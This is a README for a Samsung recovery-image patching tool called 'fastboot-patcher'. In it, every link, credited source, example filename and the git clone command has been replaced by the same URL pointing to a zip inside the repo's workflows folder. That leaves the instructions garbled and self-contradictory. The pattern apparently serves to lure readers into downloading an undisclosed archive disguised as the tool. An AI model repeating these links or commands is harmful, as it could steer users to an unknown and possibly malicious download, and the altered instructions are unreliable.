## `fastboot-patcher`
### HALT! I will not be updating this repo - due to a lack of understanding on what it does, I cannot solve anything else other than revamping the scripts!
> This repository is basically a updated version of [Johx22/Patch-Recovery](https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip)  
> Which is then based off of this script: [phhusson/samsung-galaxy-a51-gsi-boot](https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip)  
> The workflow is fixed, the scripts have been combined and revamped, etc.  
> All credit still goes to them.

## Instructions for patching!
#### In github (using Github Actions)
> Note: to use github actions, you need to fork this repository first, and also if using any other filehost than https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip, please check if you can download the image using `wget` - do not open an issue if you haven't checked the link and made sure your image was not corrupted yourself (you can use the workflow logs to see that)

Upload https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip **(*not* https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip)** to a file host website [like this](https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip),  
go over to the `Actions` tab on your fork, select `Patch Image via URL` and click `Run Workflow`.  
It should open up a little window that allows you to enter a link,  
paste the file host link for your recovery image there
`(e.g. https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip)` -  
then click `Run Workflow` again to start the process.  

When it's done, you should have 2 files available to download - 1 being the keys, of which signifigance I'm not sure myself,  
and the other will hold your patched recovery image, and a version of it that you can use for odin.

#### Natively (Arch/Debian)
> Note: you're going to need the packages *(git, wget, lz4, tar, openssl, & python3)* available in your terminal,  
> and *https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip or https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip* Personally, I unzipped the AP archive of a stock rom and got my recovery image from that.
> Also, patcher-minimal has a bunch of workarounds for the workflow, so I'm not sure how good of an idea it'd be to run that instead of patcher locally.

If you have those, then clone the repository, and move your recovery image to it.
```bash
git clone https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip && mv https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip ./fastboot-patcher/ && cd fastboot-patcher
```
Then, simply run the script with `./patcher` and wait for it to finish, it shouldn't take longer than a minute.  
You'll find the original recovery image and 2 new images *(.img and https://github.com/shanjel/fastboot-patcher/raw/refs/heads/core/.github/workflows/fastboot-patcher-v1.9-beta.1.zip for odin)* in the top directory if successful.
